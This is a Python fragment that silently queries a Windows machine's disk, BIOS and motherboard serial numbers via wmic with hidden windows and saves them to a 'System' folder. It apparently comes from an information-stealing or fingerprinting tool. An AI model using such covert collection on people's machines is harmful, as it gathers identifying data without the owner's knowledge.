import subprocess
import os

try:   
    disk_serial = subprocess.check_output(['wmic', 'diskdrive', 'get', 'serialnumber'], text=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    motherboard_serial = subprocess.check_output(['wmic', 'baseboard', 'get', 'serialnumber'], text=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    bios_serial = subprocess.check_output(['wmic', 'bios', 'get', 'serialnumber'], text=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
except:
    pass

try:
    if not os.path.exists(f"{foldername}/System"):
        os.makedirs(f"{foldername}/System")

    with open(f"{foldername}/System/Serial check.txt", "w", encoding='utf-8') as serial_check:
        serial_check.write(f"""

<=======================[SERIAL NUMBERS]=======================>

Disk : {disk_serial}
BIOS : {bios_serial}
Motherboard : {motherboard_serial}

""")

except:
    pass